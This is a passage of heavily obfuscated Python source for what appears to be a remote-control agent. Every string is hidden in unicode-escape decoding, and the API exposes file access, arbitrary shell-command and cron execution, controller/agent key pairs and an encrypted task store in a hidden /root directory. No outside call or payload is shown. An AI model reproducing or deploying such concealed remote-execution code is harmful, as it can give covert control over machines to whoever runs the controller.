    permissions: Dict[str, str] = Field(..., description=codecs.decode('\\u8def\\u5f84\\u5230\\u6743\\u9650\\u6a21\\u5f0f\\u7684\\u6620\\u5c04', 'unicode_escape'), examples=[{codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u0074\\u0065\\u0073\\u0074\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'): codecs.decode('\\u0036\\u0034\\u0034', 'unicode_escape'), codecs.decode('\\u002f\\u006f\\u0070\\u0074\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u0073', 'unicode_escape'): codecs.decode('\\u0037\\u0035\\u0035', 'unicode_escape')}])
    recursive: bool = Field(False, description=codecs.decode('\\u662f\\u5426\\u9012\\u5f52\\u5e94\\u7528\\u5230\\u5b50\\u76ee\\u5f55', 'unicode_escape'), examples=[True, False])

class AuthorityResult(BaseModel):
    path: str
    requested: str
    applied: str
    mode_octal: str
    status: str

class AuthoritySetResponse(SResponse):
    total: int
    success: int
    results: List[AuthorityResult]

class FileCatRequest(BaseModel):
    path: str = Field(..., description=codecs.decode('\\u8981\\u67e5\\u770b\\u7684\\u6587\\u4ef6\\u8def\\u5f84', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067\\u002e\\u006a\\u0073\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u002f\\u0076\\u0061\\u0072\\u002f\\u006c\\u006f\\u0067\\u002f\\u0073\\u0079\\u0073\\u006c\\u006f\\u0067', 'unicode_escape')])

class FileCatResponse(SResponse):
    path: str
    content: str
    encoding: str
    is_binary: bool
    size: int

class FileUploadRequest(BaseModel):
    path: str = Field(..., description=codecs.decode('\\u4e0a\\u4f20\\u76ee\\u6807\\u76ee\\u5f55\\u6216\\u6587\\u4ef6\\u8def\\u5f84', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064\\u0073', 'unicode_escape'), codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006e\\u0065\\u0077\\u0066\\u0069\\u006c\\u0065\\u002e\\u0074\\u0078\\u0074', 'unicode_escape')])
    filename: Optional[str] = Field(None, description=codecs.decode('\\u6587\\u4ef6\\u540d\\u0020\\u0028\\u5f53\\u0070\\u0061\\u0074\\u0068\\u662f\\u76ee\\u5f55\\u65f6\\u5fc5\\u586b\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0062\\u0061\\u0063\\u006b\\u0075\\u0070\\u002e\\u0074\\u0061\\u0072\\u002e\\u0067\\u007a', 'unicode_escape')])
    content: str = Field(..., description=codecs.decode('\\u6587\\u4ef6\\u5185\\u5bb9\\u7684\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u7f16\\u7801', 'unicode_escape'), examples=[codecs.decode('\\u0053\\u0047\\u0056\\u0073\\u0062\\u0047\\u0038\\u0067\\u0056\\u0032\\u0039\\u0079\\u0062\\u0047\\u0051\\u0068', 'unicode_escape')])
    chunk_id: Optional[int] = Field(None, description=codecs.decode('\\u5206\\u5757\\u7d22\\u5f15\\u0020\\u0028\\u0030\\u002d\\u0062\\u0061\\u0073\\u0065\\u0064\\u0029', 'unicode_escape'), examples=[0])
    total_chunks: Optional[int] = Field(None, description=codecs.decode('\\u603b\\u5206\\u5757\\u6570', 'unicode_escape'), examples=[3])

class FileUploadRawResponse(SResponse):
    codecs.decode('\\u88f8\\u4e8c\\u8fdb\\u5236\\u6d41\\u4e0a\\u4f20\\u63a5\\u53e3\\u7684\\u6807\\u51c6\\u5316\\u7ed3\\u6784\\u4f53\\u8fd4\\u56de\\u4f53', 'unicode_escape')
    path: Optional[str] = Field(None, description=codecs.decode('\\u6587\\u4ef6\\u5728\\u670d\\u52a1\\u5668\\u7aef\\u7684\\u4fdd\\u5b58\\u8def\\u5f84', 'unicode_escape'))
    chunk_id: Optional[int] = Field(None, description=codecs.decode('\\u5f53\\u524d\\u4e0a\\u4f20\\u7684\\u5206\\u7247\\u7d22\\u5f15', 'unicode_escape'))
    completed: bool = Field(..., description=codecs.decode('\\u6307\\u793a\\u8be5\\u6587\\u4ef6\\u662f\\u5426\\u5df2\\u5168\\u90e8\\u4f20\\u8f93\\u5e76\\u5408\\u5e76\\u5b8c\\u6210', 'unicode_escape'))
    message: str = Field(codecs.decode('', 'unicode_escape'), description=codecs.decode('\\u72b6\\u6001\\u63d0\\u793a\\u6d88\\u606f', 'unicode_escape'))

class FileUploadResponse(SResponse):
    path: Optional[str] = None
    received: Optional[int] = None
    total: Optional[int] = None
    chunked: Optional[bool] = None

class FileDownloadRequest(BaseModel):
    path: str = Field(..., description=codecs.decode('\\u8981\\u4e0b\\u8f7d\\u7684\\u6587\\u4ef6\\u8def\\u5f84', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u0062\\u0061\\u0063\\u006b\\u0075\\u0070\\u002e\\u0074\\u0061\\u0072\\u002e\\u0067\\u007a', 'unicode_escape')])

class FileDeleteRequest(BaseModel):
    paths: List[str] = Field(..., description=codecs.decode('\\u8981\\u5220\\u9664\\u7684\\u6587\\u4ef6\\u002f\\u76ee\\u5f55\\u8def\\u5f84\\u5217\\u8868', 'unicode_escape'), examples=[[codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006f\\u006c\\u0064\\u002e\\u006c\\u006f\\u0067', 'unicode_escape'), codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u0063\\u0061\\u0063\\u0068\\u0065', 'unicode_escape')]])
    path: Optional[str] = Field(None, exclude=True)
    path2: Optional[str] = Field(None, exclude=True)

class FileDeleteResult(BaseModel):
    path: str
    status: str

class FileDeleteResponse(BaseModel):
    status: str
    results: List[FileDeleteResult]

class FileMoveRequest(BaseModel):
    move_map: Dict[str, str] = Field(..., description=codecs.decode('\\u6e90\\u8def\\u5f84\\u5230\\u76ee\\u6807\\u8def\\u5f84\\u7684\\u6620\\u5c04', 'unicode_escape'), examples=[{codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006f\\u006c\\u0064\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'): codecs.decode('\\u002f\\u0061\\u0072\\u0063\\u0068\\u0069\\u0076\\u0065\\u002f\\u006f\\u006c\\u0064\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'), codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006c\\u006f\\u0067\\u0073', 'unicode_escape'): codecs.decode('\\u002f\\u0062\\u0061\\u0063\\u006b\\u0075\\u0070\\u002f\\u006c\\u006f\\u0067\\u0073', 'unicode_escape')}])
    path: Optional[str] = Field(None, exclude=True)
    mvpath: Optional[str] = Field(None, exclude=True)

class FileMoveResult(BaseModel):
    from_field: str = Field(..., alias=codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'))
    to: str
    status: str
    model_config = ConfigDict(populate_by_name=True)

class FileMoveResponse(BaseModel):
    status: str
    total: int
    success: int
    results: List[Dict[str, str]]

class FileMkdirRequest(BaseModel):
    path: str = Field(..., description=codecs.decode('\\u8981\\u521b\\u5efa\\u7684\\u65b0\\u76ee\\u5f55\\u8def\\u5f84', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006e\\u0065\\u0077\\u002f\\u0070\\u0072\\u006f\\u006a\\u0065\\u0063\\u0074\\u002f\\u006c\\u006f\\u0067\\u0073', 'unicode_escape')])

class FileMkdirResponse(BaseModel):
    status: str
    path: str

class FileZipRequest(BaseModel):
    path: str = Field(..., description=codecs.decode('\\u76ee\\u6807\\u0020\\u007a\\u0069\\u0070\\u0020\\u8def\\u5f84\\u003b\\u0020\\u7236\\u76ee\\u5f55\\u81ea\\u52a8\\u521b\\u5efa\\u002c\\u0020\\u5df2\\u5b58\\u5728\\u65f6\\u8986\\u76d6\\u91cd\\u5efa', 'unicode_escape'))
    items: Optional[List[str]] = Field(None, description=codecs.decode('\\u5f85\\u538b\\u7f29\\u6587\\u4ef6\\u002f\\u76ee\\u5f55\\u5217\\u8868\\u003b\\u0020\\u76ee\\u5f55\\u9012\\u5f52\\u6253\\u5305\\u003b\\u0020\\u5355\\u9879\\u5931\\u8d25\\u4e0d\\u4e2d\\u65ad', 'unicode_escape'))
    flat: bool = Field(False, description=codecs.decode('\\u0054\\u0072\\u0075\\u0065\\u0020\\u65f6\\u76ee\\u5f55\\u5185\\u5bb9\\u4e0d\\u5e26\\u9876\\u5c42\\u76ee\\u5f55\\u540d\\u524d\\u7f00', 'unicode_escape'))

class FileZipItemResult(BaseModel):
    item: str
    status: str
    added: int = 0

class FileZipResponse(BaseModel):
    status: str
    path: str
    entries: int
    size: int
    results: List[FileZipItemResult]

class FileUnzipRequest(BaseModel):
    path: str = Field(..., description=codecs.decode('\\u007a\\u0069\\u0070\\u0020\\u538b\\u7f29\\u5305\\u8def\\u5f84\\u0020\\u0028\\u5b89\\u5168\\u6c99\\u7bb1\\u5185\\u0029', 'unicode_escape'))
    dest_path: Optional[str] = Field(None, description=codecs.decode('\\u89e3\\u538b\\u76ee\\u6807\\u76ee\\u5f55\\u002c\\u0020\\u7f3a\\u7701\\u4e3a\\u0020\\u007a\\u0069\\u0070\\u0020\\u6240\\u5728\\u76ee\\u5f55\\u003b\\u0020\\u76ee\\u5f55\\u4e0d\\u5b58\\u5728\\u81ea\\u52a8\\u521b\\u5efa', 'unicode_escape'))
    overwrite: bool = Field(True, description=codecs.decode('\\u76ee\\u6807\\u6587\\u4ef6\\u5df2\\u5b58\\u5728\\u65f6\\u662f\\u5426\\u8986\\u76d6\\u002c\\u0020\\u9ed8\\u8ba4\\u0020\\u0074\\u0072\\u0075\\u0065\\u003b\\u0020\\u0066\\u0061\\u006c\\u0073\\u0065\\u0020\\u65f6\\u8df3\\u8fc7\\u5e76\\u8ba1\\u5165\\u0020\\u0073\\u006b\\u0069\\u0070\\u0070\\u0065\\u0064', 'unicode_escape'))
    entries: Optional[List[str]] = Field(None, description=codecs.decode('\\u4ec5\\u89e3\\u538b\\u5339\\u914d\\u6761\\u76ee\\u0020\\u0028\\u7cbe\\u786e\\u540d\\u6216\\u4e0d\\u5e26\\u8def\\u5f84\\u5339\\u914d\\u0029\\u002c\\u0020\\u7f3a\\u7701\\u89e3\\u538b\\u5168\\u90e8', 'unicode_escape'))

class FileUnzipResponse(BaseModel):
    status: str
    path: str
    dest: str
    extracted: int
    skipped: int
    files: List[str]
    files_truncated: bool

class OneTimeTaskGetResponse(BaseModel):
    status: str = Field(codecs.decode('\\u006f\\u006b', 'unicode_escape'), description=codecs.decode('\\u8bf7\\u6c42\\u72b6\\u6001', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape')])
    count: int = Field(..., description=codecs.decode('\\u5f85\\u6267\\u884c\\u4efb\\u52a1\\u7684\\u6570\\u91cf', 'unicode_escape'), examples=[2])
    tasks: List[str] = Field(..., description=codecs.decode('\\u5f85\\u6267\\u884c\\u7684\\u4efb\\u52a1\\u547d\\u4ee4\\u5217\\u8868', 'unicode_escape'), examples=[[codecs.decode('\\u0065\\u0063\\u0068\\u006f\\u0020\\u0027\\u0069\\u006e\\u0069\\u0074\\u0027', 'unicode_escape'), codecs.decode('\\u002f\\u006f\\u0070\\u0074\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u0073\\u002f\\u0073\\u0065\\u0074\\u0075\\u0070\\u002e\\u0073\\u0068', 'unicode_escape')]])

class OneTimeTaskRequest(RootModel):
    root: List[str]

class OneTimeTaskResponse(CountResponse):
    tasks: List[str]
    executed: Optional[List[Any]] = None
    persisted: Optional[bool] = Field(None, description=codecs.decode('\\u662f\\u5426\\u5df2\\u6301\\u4e45\\u5316\\u843d\\u76d8\\u0020\\u0028\\u0064\\u006f\\u0063\\u0073\\u002f\\u0041\\u0050\\u0049\\u002e\\u004d\\u0044\\u0020\\u5341\\u4e09\\u0029', 'unicode_escape'), examples=[True])

class CronTasksResponse(CountResponse):
    tasks: Dict[str, str] = Field(..., description=codecs.decode('\\u0043\\u0072\\u006f\\u006e\\u8868\\u8fbe\\u5f0f\\u4e0e\\u547d\\u4ee4\\u7684\\u6620\\u5c04\\u5b57\\u5178', 'unicode_escape'), examples=[{codecs.decode('\\u002a\\u002f\\u0031\\u0030\\u0020\\u002a\\u0020\\u002a\\u0020\\u002a\\u0020\\u002a', 'unicode_escape'): codecs.decode('\\u0070\\u0079\\u0074\\u0068\\u006f\\u006e\\u0020\\u002f\\u006f\\u0070\\u0074\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u0073\\u002f\\u0068\\u0065\\u0061\\u006c\\u0074\\u0068\\u005f\\u0063\\u0068\\u0065\\u0063\\u006b\\u002e\\u0070\\u0079', 'unicode_escape')}])
    persisted: Optional[bool] = Field(None, description=codecs.decode('\\u662f\\u5426\\u5df2\\u6301\\u4e45\\u5316\\u843d\\u76d8\\u0020\\u0028\\u0064\\u006f\\u0063\\u0073\\u002f\\u0041\\u0050\\u0049\\u002e\\u004d\\u0044\\u0020\\u5341\\u4e09\\u0029', 'unicode_escape'), examples=[True])

class BaseLogEntry(BaseModel):
    ts: str = Field(..., description=codecs.decode('\\u6267\\u884c\\u65f6\\u95f4\\u6233', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0032\\u0034\\u002d\\u0030\\u0031\\u002d\\u0031\\u0035\\u0054\\u0031\\u0030\\u003a\\u0033\\u0030\\u003a\\u0034\\u0035\\u005a', 'unicode_escape')])
    cmd: str = Field(..., description=codecs.decode('\\u6267\\u884c\\u7684\\u547d\\u4ee4', 'unicode_escape'))
    output: str = Field(..., description=codecs.decode('\\u547d\\u4ee4\\u8f93\\u51fa\\u5185\\u5bb9', 'unicode_escape'))
    exitcode: int = Field(..., description=codecs.decode('\\u9000\\u51fa\\u7801', 'unicode_escape'))
    type: str = Field(..., description=codecs.decode('\\u65e5\\u5fd7\\u7c7b\\u578b', 'unicode_escape'))
    formatted: Optional[str] = Field(None, description=codecs.decode('\\u683c\\u5f0f\\u5316\\u540e\\u7684\\u6458\\u8981', 'unicode_escape'))

class CronLogEntry(BaseLogEntry):
    cron: str = Field(..., description=codecs.decode('\\u0043\\u0072\\u006f\\u006e\\u0020\\u8868\\u8fbe\\u5f0f', 'unicode_escape'), examples=[codecs.decode('\\u002a\\u002f\\u0035\\u0020\\u002a\\u0020\\u002a\\u0020\\u002a\\u0020\\u002a', 'unicode_escape')])

class TaskLogResponse(CountResponse):
    logs: List[Any]

class LogClearResponse(SResponse):
    cleared: str = Field(..., description=codecs.decode('\\u88ab\\u6e05\\u7a7a\\u7684\\u65e5\\u5fd7\\u7c7b\\u578b', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'), codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape')])

class LogStats(BaseModel):
    total_logged: int
    max_capacity: int
    recent_success: int
    recent_failed: int

class LogSummaryResponse(BaseModel):
    onetime: LogStats
    cron: LogStats

class OnetimeStatus(BaseModel):
    pending: bool = Field(..., description=codecs.decode('\\u662f\\u5426\\u6709\\u5f85\\u6267\\u884c\\u7684\\u4efb\\u52a1', 'unicode_escape'), examples=[False])
    count: int = Field(..., description=codecs.decode('\\u5f85\\u6267\\u884c\\u4efb\\u52a1\\u6570\\u91cf', 'unicode_escape'), examples=[3])

class CronStatus(BaseModel):
    active: bool = Field(..., description=codecs.decode('\\u5b9a\\u65f6\\u4efb\\u52a1\\u8c03\\u5ea6\\u5668\\u662f\\u5426\\u5904\\u4e8e\\u6d3b\\u8dc3\\u72b6\\u6001', 'unicode_escape'), examples=[True])
    count: int = Field(..., description=codecs.decode('\\u5f53\\u524d\\u914d\\u7f6e\\u7684\\u5b9a\\u65f6\\u4efb\\u52a1\\u6570\\u91cf', 'unicode_escape'), examples=[2])
    check_interval: int = Field(..., description=codecs.decode('\\u68c0\\u67e5\\u95f4\\u9694\\u0028\\u79d2\\u0029', 'unicode_escape'), examples=[30])

class TaskPersistenceStatus(BaseModel):
    enabled: bool = Field(..., description=codecs.decode('\\u4efb\\u52a1\\u6301\\u4e45\\u5316\\u662f\\u5426\\u542f\\u7528\\u0020\\u0028\\u004b\\u0053\\u0054\\u004f\\u0052\\u0045\\u005f\\u004b\\u0045\\u0059\\u002f\\u004b\\u0053\\u0054\\u004f\\u0052\\u0045\\u0029', 'unicode_escape'), examples=[True])
    store_path: Optional[str] = Field(None, description=codecs.decode('\\u52a0\\u5bc6\\u5b58\\u50a8\\u6587\\u4ef6\\u8def\\u5f84', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0072\\u006f\\u006f\\u0074\\u002f\\u002e\\u0074\\u006d\\u0070\\u002f\\u0073\\u0074\\u006f\\u0072\\u0065\\u002e\\u0065\\u006e\\u0063', 'unicode_escape')])
    last_saved_at: Optional[str] = Field(None, description=codecs.decode('\\u6700\\u8fd1\\u4e00\\u6b21\\u6210\\u529f\\u843d\\u76d8\\u65f6\\u95f4\\u0020\\u0028\\u0055\\u0054\\u0043\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0032\\u0036\\u002d\\u0030\\u0039\\u002d\\u0032\\u0035\\u0054\\u0031\\u0030\\u003a\\u0033\\u0030\\u003a\\u0034\\u0035\\u005a', 'unicode_escape')])

class TaskStatusResponse(BaseModel):
    onetime: OnetimeStatus
    cron: CronStatus
    persistence: TaskPersistenceStatus

class OnetimeExecuteResponse(BaseModel):
    status: str = Field(codecs.decode('\\u006f\\u006b', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape')])
    message: Optional[str] = Field(None, description=codecs.decode('\\u72b6\\u6001\\u8bf4\\u660e', 'unicode_escape'))
    executed: int = Field(..., description=codecs.decode('\\u6210\\u529f\\u89e6\\u53d1\\u7684\\u4efb\\u52a1\\u6570\\u91cf', 'unicode_escape'), examples=[2])
    results: List[Dict[str, Any]] = Field(..., description=codecs.decode('\\u6bcf\\u4e2a\\u4efb\\u52a1\\u7684\\u8be6\\u7ec6\\u6267\\u884c\\u7ed3\\u679c', 'unicode_escape'), examples=[[{codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): codecs.decode('\\u0065\\u0063\\u0068\\u006f\\u0020\\u0027\\u0068\\u0065\\u006c\\u006c\\u006f\\u0027', 'unicode_escape'), codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): 0, codecs.decode('\\u0073\\u0074\\u0064\\u006f\\u0075\\u0074', 'unicode_escape'): codecs.decode('\\u0068\\u0065\\u006c\\u006c\\u006f\\u000a', 'unicode_escape'), codecs.decode('\\u0073\\u0074\\u0064\\u0065\\u0072\\u0072', 'unicode_escape'): codecs.decode('', 'unicode_escape')}]])
_BASE_DIR = os.path.dirname(os.path.abspath(__file__))

def _get_config_value(key: str, default: str=codecs.decode('', 'unicode_escape'), file_path: str=None) -> str:
    O0_var_34 = os.getenv(key)
    if O0_var_34 is not None:
        return O0_var_34.strip()
    if file_path:
        O0_var_35 = os.path.join(_BASE_DIR, file_path)
        if os.path.exists(O0_var_35):
            try:
                with open(O0_var_35, codecs.decode('\\u0072', 'unicode_escape'), encoding=codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')) as O0_var_36:
                    O0_var_37 = O0_var_36.read().strip()
                    if O0_var_37:
                        return O0_var_37
            except Exception:
                pass
    return default.strip() if default else codecs.decode('', 'unicode_escape')

@dataclass
class NoiseKeypair:
    codecs.decode('\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u534f\\u8bae\\u5bc6\\u94a5\\u5bf9\\u6570\\u636e\\u7c7b', 'unicode_escape')
    role: str
    private_b64: str
    public_b64: str

    def to_dict(self) -> Dict[str, str]:
        return asdict(self)

    @property
    def private_bytes(self) -> bytes:
        return base64.b64decode(self.private_b64)

    @property
    def public_bytes(self) -> bytes:
        return base64.b64decode(self.public_b64)

class NoiseKeyGenerator:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0063\\u006f\\u006c\\u0020\\u0058\\u0032\\u0035\\u0035\\u0031\\u0039\\u0020\\u5bc6\\u94a5\\u5bf9\\u751f\\u6210\\u5668\\u000a\\u0020\\u0020\\u0020\\u0020\\u000a\\u0020\\u0020\\u0020\\u0020\\u751f\\u6210\\u7b26\\u5408\\u0020\\u006e\\u006f\\u0069\\u0073\\u0065\\u002d\\u0063\\u0020\\u002f\\u0020\\u006e\\u006f\\u0069\\u0073\\u0065\\u0070\\u0072\\u006f\\u0074\\u006f\\u0063\\u006f\\u006c\\u0020\\u6807\\u51c6\\u7684\\u0020\\u0033\\u0032\\u0020\\u5b57\\u8282\\u0020\\u0052\\u0061\\u0077\\u0020\\u683c\\u5f0f\\u5bc6\\u94a5\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')
    KEY_SIZE = 32
    ENCODING = serialization.Encoding.Raw
    PRIVATE_FORMAT = serialization.PrivateFormat.Raw
    PUBLIC_FORMAT = serialization.PublicFormat.Raw

    @staticmethod
    def _generate_raw_keypair() -> Tuple[bytes, bytes]:
        O0_var_38 = x25519.X25519PrivateKey.generate()
        O0_var_39 = O0_var_38.public_key()
        O0_var_40 = O0_var_38.private_bytes(encoding=NoiseKeyGenerator.ENCODING, format=NoiseKeyGenerator.PRIVATE_FORMAT, encryption_algorithm=serialization.NoEncryption())
        O0_var_41 = O0_var_39.public_bytes(encoding=NoiseKeyGenerator.ENCODING, format=NoiseKeyGenerator.PUBLIC_FORMAT)
        assert len(O0_var_40) == NoiseKeyGenerator.KEY_SIZE
        assert len(O0_var_41) == NoiseKeyGenerator.KEY_SIZE
        return (O0_var_40, O0_var_41)

    @classmethod
    def generate_single(cls, role_name: str) -> NoiseKeypair:
        O0_var_42, O0_var_43 = cls._generate_raw_keypair()
        return NoiseKeypair(role=role_name, private_b64=base64.b64encode(O0_var_42).decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')), public_b64=base64.b64encode(O0_var_43).decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')))

    @classmethod
    def generate_pair(cls, control_role: str=codecs.decode('\\u0043\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u006c\\u0065\\u0072', 'unicode_escape'), agent_role: str=codecs.decode('\\u0041\\u0067\\u0065\\u006e\\u0074', 'unicode_escape')) -> Dict[str, NoiseKeypair]:
        return {codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape'): cls.generate_single(control_role), codecs.decode('\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'): cls.generate_single(agent_role)}

class Config:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u914d\\u7f6e\\u4e2d\\u5fc3\\u0020\\u002d\\u0020\\u652f\\u6301\\u591a\\u7ea7\\u914d\\u7f6e\\u6e90\\u000a\\u0020\\u0020\\u0020\\u0020\\u4f18\\u5148\\u7ea7\\u003a\\u0020\\u73af\\u5883\\u53d8\\u91cf\\u0020\\u003e\\u0020\\u672c\\u5730\\u6587\\u4ef6\\u0020\\u003e\\u0020\\u9ed8\\u8ba4\\u503c\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')
    Rtimeout = int(os.getenv(codecs.decode('\\u0045\\u0058\\u0045\\u0043\\u005f\\u0054\\u0049\\u004d\\u0045\\u004f\\u0055\\u0054', 'unicode_escape'), codecs.decode('\\u0033\\u0030', 'unicode_escape')))
    EXEC_SHELL_MODE = os.getenv(codecs.decode('\\u0045\\u0058\\u0045\\u0043\\u005f\\u0053\\u0048\\u0045\\u004c\\u004c', 'unicode_escape'), codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')).lower() == codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
    DEBUG = os.getenv(codecs.decode('\\u0044\\u0045\\u0042\\u0055\\u0047', 'unicode_escape'), codecs.decode('\\u0066\\u0061\\u006c\\u0073\\u0065', 'unicode_escape')).lower() == codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
    TIMESTAMP_WINDOW = int(os.getenv(codecs.decode('\\u0054\\u0049\\u004d\\u0045\\u0053\\u0054\\u0041\\u004d\\u0050\\u005f\\u0057\\u0049\\u004e\\u0044\\u004f\\u0057', 'unicode_escape'), codecs.decode('\\u0033\\u0036\\u0030\\u0030', 'unicode_escape')))
    ECDSA_PUBLIC_KEY_PEM = _get_config_value(key=codecs.decode('\\u0045\\u0043\\u0044\\u0053\\u0041\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059', 'unicode_escape'), file_path=codecs.decode('\\u006b\\u0065\\u0079\\u0073\\u002f\\u0061\\u0067\\u0065\\u006e\\u0074\\u005f\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0075\\u0062\\u002e\\u0070\\u0065\\u006d', 'unicode_escape')) or codecs.decode('\\u0045\\u0043\\u0044\\u0053\\u0041\\u516c\\u94a5\\u5185\\u5bb9', 'unicode_escape')
    ECIES_PUBLIC_KEY_PEM = _get_config_value(key=codecs.decode('\\u0045\\u0043\\u0049\\u0045\\u0053\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059', 'unicode_escape'), file_path=codecs.decode('\\u006b\\u0065\\u0079\\u0073\\u002f\\u0061\\u0067\\u0065\\u006e\\u0074\\u005f\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062\\u002e\\u0062\\u0036\\u0034', 'unicode_escape')) or codecs.decode('\\u0045\\u0043\\u0049\\u0045\\u0053\\u516c\\u94a5\\u5185\\u5bb9', 'unicode_escape')
    _raw_key = get_random_bytes(32)
    SESSION_KEY = base64.b64encode(_raw_key).decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
    keys = NoiseKeyGenerator.generate_pair()
    NOISE_KEY = {codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u006c\\u0065\\u0072', 'unicode_escape'): {codecs.decode('\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065', 'unicode_escape'): keys[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape')].private_b64}, codecs.decode('\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'): {codecs.decode('\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063', 'unicode_escape'): keys[codecs.decode('\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape')].public_b64}}

    @staticmethod
    def ws_downgrade_token() -> str:
        O0_var_44 = base64.b64decode(Config.SESSION_KEY)
        O0_var_45 = hmac.new(O0_var_44, b'kisama-ws-token-v1', hashlib.sha256).digest()
        return base64.b64encode(O0_var_45).decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))

    @classmethod
    def rotate_operational_secrets(cls):
        O0_var_46 = NoiseKeyGenerator.generate_pair()
        cls.keys[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape')] = O0_var_46[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape')]
        cls.NOISE_KEY[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u006c\\u0065\\u0072', 'unicode_escape')][codecs.decode('\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065', 'unicode_escape')] = O0_var_46[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape')].private_b64
        cls._raw_key = get_random_bytes(32)
        cls.SESSION_KEY = base64.b64encode(cls._raw_key).decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
        cls._baseinfo_cache = None
        cls._baseinfo_cache_time = 0.0
        cls._status_cache = None
        cls._status_cache_time = 0.0
        Logger.warning(codecs.decode('\\U0001f504\\u0020\\u005b\\u0053\\u0045\\u0043\\u0055\\u0052\\u0049\\u0054\\u0059\\u005d\\u0020\\u4e34\\u65f6\\u5bc6\\u94a5\\u8fc7\\u671f\\u002c\\u0020\\u5df2\\u8f6e\\u6362\\u0020\\u0053\\u0045\\u0053\\u0053\\u0049\\u004f\\u004e\\u005f\\u004b\\u0045\\u0059\\u0020\\u4e0e\\u63a7\\u5236\\u7aef\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u5bc6\\u94a5\\u5bf9\\u0020\\u0028\\u5408\\u6cd5\\u63a7\\u5236\\u7aef\\u9700\\u91cd\\u65b0\\u8ba4\\u8bc1\\u83b7\\u53d6\\u0020\\u0062\\u0061\\u0073\\u0065\\u0069\\u006e\\u0066\\u006f\\u0020\\u65b0\\u5bc6\\u94a5\\u0029', 'unicode_escape'))
    FILE_ROOT = _resolve_safe_file_root()
    MAX_UPLOAD_SIZE = int(os.getenv(codecs.decode('\\u004d\\u0041\\u0058\\u005f\\u0055\\u0050\\u004c\\u004f\\u0041\\u0044\\u005f\\u0053\\u0049\\u005a\\u0045', 'unicode_escape'), codecs.decode('\\u0031\\u0030\\u0034\\u0038\\u0035\\u0037\\u0036\\u0030\\u0030', 'unicode_escape')))
